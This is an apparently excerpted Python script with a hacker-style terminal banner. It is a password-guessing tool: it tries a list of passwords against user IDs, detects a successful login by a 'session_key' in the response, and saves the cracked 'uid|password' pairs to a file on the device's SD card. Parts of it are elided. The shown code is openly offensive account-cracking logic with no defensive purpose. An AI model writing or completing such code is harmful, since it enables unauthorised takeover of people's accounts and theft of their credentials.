...
\033[1;99m==============================================================================
\033[1;32m[✓]AUTHOR  :\033[1;32m ANIS GIT
...
def file_subb(uid,pwx):
    global oks,loop
    sys.stdout.write(f"\r  \033[38;5;46m[XXNX] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "session_key" in q:
                ...
                open("/sdcard/XXNX-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
